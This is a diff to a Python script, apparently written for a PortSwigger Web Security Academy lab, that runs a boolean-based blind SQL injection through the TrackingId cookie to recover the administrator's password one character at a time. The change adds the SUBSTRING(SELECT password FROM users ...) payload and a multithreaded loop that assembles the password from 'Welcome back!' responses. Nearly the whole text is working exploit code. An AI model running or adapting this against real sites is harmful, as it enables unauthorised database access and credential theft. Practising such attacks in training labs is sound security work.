@@ -1,5 +1,5 @@
 import requests
-import threading
+import concurrent.futures
 import re
 
 def getPayload():
@@ -9,44 +9,42 @@ def getPayload():
 
 	return payloads
 
-def sendGetRequest(domain, payload):
+def sendGetRequest(domain, index, payload):
 	parameters = {}
 	headers = {}
-	cookies = { 'TrackingId':'PMIIyAp7oToqqkd1\'+AND+\'1\'=\'2',
-				'session':'J2O16Q54nWSn1T3z9ep0mxe68lsJKXqY'}
+	cookies = { 'TrackingId':f'dMzIYe8HpIvHYLeI\'+AND+SUBSTRING((SELECT+password+FROM+users+WHERE+username=\'administrator\'),{index},1)=\'{payload}',
+				'session':'kyOezoeECmPPXbQnxgx6vdomwPc47h2t'}
 
 	r = requests.get(domain, cookies=cookies)
 	return r
 
 payloads = getPayload()
-domain = 'https://ac001f8b1f19565980084f0d006b00e5.web-security-academy.net/'
+domain = 'https://aca81fdb1e35733380055fe700880024.web-security-academy.net/'
+password = ''
 
-def sendIt(payload):
-	response = sendGetRequest(domain, payload)
-	print(response.status_code)
+def sendIt(payload, index):
+	response = sendGetRequest(domain, index, payload)
 	match = response.text
-	print('===============================================================')
-	if match.find('Welcome back!') == -1:
-		print("didnt find it")
+	if match.find('Welcome back!') != -1:
+		print('FoundChar:',payload)
+		return payload
 	else:
-		print('found it')
+		return None
 
-#for payload in payloads:
-#	print(payload)
-sendIt(payloads[0])
+i = 1
+found = True
+while found:
+	threads = []
 
-'''
-threads = []
+	with concurrent.futures.ThreadPoolExecutor() as executor:
+		threads = [executor.submit(sendIt, payload, i) for payload in payloads]
 
-for payload in payloads:
-	t = threading.Thread(target=sendIt, args=[payload])
-	threads.append(t)
+		found = False
+		for f in concurrent.futures.as_completed(threads):
+			if f.result() != None:
+				password+=f.result()
+				found = True
+				i+=1
 
-for t in threads:
-	t.start()
-
-for t in threads:
-	t.join()
-
+print("Found:", found)
 print('Success')
-'''
